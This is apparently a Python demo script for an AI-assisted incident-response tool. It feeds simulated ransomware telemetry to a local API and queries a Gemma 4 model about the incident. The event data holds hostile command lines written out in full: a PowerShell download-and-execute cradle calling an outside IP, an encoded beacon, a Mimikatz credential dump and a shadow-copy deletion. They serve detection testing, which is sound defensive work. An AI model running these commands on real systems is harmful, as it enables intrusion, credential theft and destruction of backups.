# -*- coding: utf-8 -*-
"""Live SOC analyst chat demo with IR-Agent (Gemma 4)."""
import sys, os, json, urllib.request, urllib.error, time, re, textwrap
sys.stdout.reconfigure(encoding='utf-8')
os.chdir(os.path.dirname(os.path.abspath(__file__)))
try:
    from dotenv import load_dotenv; load_dotenv()
except ImportError:
    pass

TOKEN = os.getenv('MY_API_TOKEN', '')
BASE  = 'http://localhost:9000'

def req(method, url, data=None, timeout=120):
    body = json.dumps(data).encode() if data else None
    headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {TOKEN}'}
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try:    return e.code, json.loads(e.read())
        except: return e.code, {}
    except Exception as e:
        return -1, {'error': str(e)}

def clean(text):
    return re.sub(r'<thought>.*?</thought>', '', text or '', flags=re.DOTALL).strip()

def get_reply(res):
    for k in ('answer', 'response', 'reply', 'message', 'content'):
        v = res.get(k)
        if v and len(str(v)) > 5:
            return str(v)
    return json.dumps(res, ensure_ascii=False)

def hr(c='═', n=66): print(c * n)

hr('╔', 1); print('║  IR-Agent × Gemma 4  —  LIVE SOC ANALYST DEMO  ║'); hr('╚', 1)
hr()

# ── Step 1: System Status ─────────────────────────────────────────────────────
print('\n[SYSTEM STATUS]')
code, res = req('GET', f'{BASE}/health')
comp = res.get('components', {})
print(f'  Status:       {res.get("status","?")}')
print(f'  Version:      {res.get("version","?")}')
print(f'  AI Analyzer:  {comp.get("ai_analyzer","?")}')
print(f'  ML Model:     {comp.get("ml_model", "?")}')

code2, ml = req('GET', f'{BASE}/health/ml')
mlm = ml.get('ml_model', {})
print(f'  ML Version:   {mlm.get("model_version","?")}')
print(f'  ML Threshold: {mlm.get("threshold","?")}')

# ── Step 2: Ingest fresh attack ───────────────────────────────────────────────
hr()
print('\n[SIMULATING ATTACK CHAIN on CORP-PC-ALICE]')
print('  Sending 5 events that represent a full ransomware lifecycle...\n')

events = [
    {'label': 'Email phishing attachment opens Word',
     'ev': {'host':'CORP-PC-ALICE','timestamp':'2026-04-28T12:00:00Z',
            'event_type':'process_create','process_name':'cmd.exe',
            'command_line':'cmd /c powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString(\'http://185.220.101.45/stage1.ps1\')',
            'parent_process':'WINWORD.EXE','user':'CORP\\alice','severity':'critical'}},
    {'label': 'PowerShell C2 beacon (base64 encoded)',
     'ev': {'host':'CORP-PC-ALICE','timestamp':'2026-04-28T12:00:30Z',
            'event_type':'network_connection','process_name':'powershell.exe',
            'command_line':'powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=',
            'destination_ip':'185.220.101.45','destination_port':443,'severity':'high'}},
    {'label': 'Mimikatz credential dump',
     'ev': {'host':'CORP-PC-ALICE','timestamp':'2026-04-28T12:01:00Z',
            'event_type':'process_create','process_name':'mimikatz.exe',
            'command_line':'mimikatz sekurlsa::logonpasswords exit',
            'parent_process':'powershell.exe','user':'CORP\\alice','severity':'critical'}},
    {'label': 'VSS delete (ransomware prep)',
     'ev': {'host':'CORP-PC-ALICE','timestamp':'2026-04-28T12:02:00Z',
            'event_type':'process_create','process_name':'vssadmin.exe',
            'command_line':'vssadmin delete shadows /all /quiet',
            'parent_process':'cmd.exe','user':'CORP\\alice','severity':'critical'}},
    {'label': 'Ransom note dropped',
     'ev': {'host':'CORP-PC-ALICE','timestamp':'2026-04-28T12:02:30Z',
            'event_type':'file_create','process_name':'locker.exe',
            'file_path':'C:/Users/alice/Desktop/READ_ME_RANSOM.txt',
            'user':'CORP\\alice','severity':'critical'}},
]

incident_id = None
for item in events:
    code, res = req('POST', f'{BASE}/ingest/telemetry', data=item['ev'])
    inc = res.get('incident_id', res.get('id'))
    sym = '✓' if code == 200 else '✗'
    print(f'  {sym} {item["label"][:55]:<55}  → incident={inc or "queued"}')
    if inc and not incident_id:
        incident_id = inc

# ── Step 3: Check what incident was created ───────────────────────────────────
time.sleep(1)
hr()
print('\n[INCIDENT DETECTION RESULT]')
code, res = req('GET', f'{BASE}/ingest/incidents')
all_inc = res.get('incidents', []) if isinstance(res, dict) else (res if isinstance(res, list) else [])

latest = None
for i in all_inc:
    if i.get('host') == 'CORP-PC-ALICE':
        latest = i
        break
if not latest and all_inc:
    latest = all_inc[0]

if latest:
    incident_id = latest.get('id', incident_id)
    print(f'  Incident ID:    {latest.get("id")}')
    print(f'  Host:           {latest.get("host")}')
    print(f'  Severity:       {str(latest.get("severity","?")).upper()}')
    print(f'  Classification: {latest.get("classification")}')
    print(f'  Events:         {latest.get("event_count")}')
    print(f'  Status:         {latest.get("status")}')
else:
    print('  (No incident found for CORP-PC-ALICE — may be grouped with existing)')
    if all_inc:
        latest = all_inc[0]
        incident_id = latest.get('id')
        print(f'  Using: {incident_id}  ({latest.get("host")}  sev={latest.get("severity")}  events={latest.get("event_count")})')

# ── Step 4: Full AI Investigation ─────────────────────────────────────────────
hr()
print(f'\n[AI INVESTIGATION — {incident_id}]')
print('  Sending incident to Gemma 4 for deep analysis...')
print('  (This uses: timeline analysis + MITRE mapping + IoC lookup + report generation)\n')

t0 = time.time()
code, res = req('POST', f'{BASE}/ingest/incidents/{incident_id}/investigate', timeout=200)
elapsed = time.time() - t0

if code == 200:
    msg = res.get('message', res.get('summary', ''))
    status_r = res.get('status', '?')
    print(f'  Status: {status_r}  ({elapsed:.1f}s)')
    if msg:
        for line in textwrap.wrap(clean(msg)[:500], width=63):
            print(f'  {line}')
elif code == -1:
    print(f'  Investigation running (>{elapsed:.0f}s) — reading cached report...')
else:
    print(f'  [{code}] {json.dumps(res)[:200]}')

# ── Step 5: Read full report ───────────────────────────────────────────────────
print()
code, res = req('GET', f'{BASE}/ingest/incidents/{incident_id}/report')
if code == 200:
    report = res.get('report', res.get('content', json.dumps(res)))
    report_clean = clean(report) if isinstance(report, str) else json.dumps(report, ensure_ascii=False)
    print('  ┌─────────────────── INVESTIGATION REPORT ───────────────────┐')
    for line in report_clean[:1200].splitlines():
        short = line[:63]
        print(f'  │ {short:<63} │')
    print('  └────────────────────────────────────────────────────────────┘')

# ── Step 6: SOC Chat ──────────────────────────────────────────────────────────
hr()
print('\n[SOC ANALYST Q&A — Gemma 4 Direct]')
print('  Asking 4 questions about this attack...\n')

questions = [
    'Map each step to MITRE: WINWORD→cmd→powershell download → mimikatz credentials → vssadmin delete shadows. Give technique IDs.',
    f'Incident {incident_id} on CORP-PC-ALICE: what is the attacker dwell time, and what is the blast radius if credentials were already exfiltrated?',
    'IP 185.220.101.45 was C2. Should SOC block it immediately or investigate first? What other network indicators should we hunt?',
    'Give 5 immediate containment actions for an active ransomware on CORP-PC-ALICE, in order of priority.',
]

SESSION = f'soc-{incident_id}'
for i, q in enumerate(questions, 1):
    print(f'  ── Q{i}: {q[:80]}...' if len(q) > 80 else f'  ── Q{i}: {q}')
    t0 = time.time()
    code, res = req('POST', f'{BASE}/agent/query',
                    data={'query': q, 'session_id': f'{SESSION}-q{i}'},
                    timeout=120)
    elapsed = time.time() - t0

    if code == -1:
        print(f'  A{i}: [timeout {elapsed:.0f}s — try again later]')
    else:
        reply = clean(get_reply(res))
        if 'Error calling LLM' in reply or 'LLM providers failed' in reply:
            # LLM rate limit — show raw answer if available
            fallback = res.get('answer', res.get('fallback_answer', ''))
            if fallback:
                reply = clean(fallback)
            else:
                reply = '[Google API rate-limited, retrying with Groq...]'
        print(f'  A{i} ({elapsed:.1f}s):')
        for line in textwrap.wrap(reply[:500], width=63):
            print(f'      {line}')
    print()

# ── Step 7: Final metrics ──────────────────────────────────────────────────────
hr()
print('\n[SYSTEM METRICS]')
try:
    _r = urllib.request.Request(f'{BASE}/metrics', headers={'Authorization': f'Bearer {TOKEN}'})
    with urllib.request.urlopen(_r, timeout=10) as _resp:
        lines = [l for l in _resp.read().decode().splitlines() if l and not l.startswith('#')]
    for line in lines[:12]:
        print(f'  {line}')
except Exception as e:
    print(f'  (metrics: {e})')

hr()
print('  IR-Agent demo complete.')
print('  ✓ ML detection  ✓ Incident correlation  ✓ AI investigation  ✓ Gemma 4 chat')
hr()
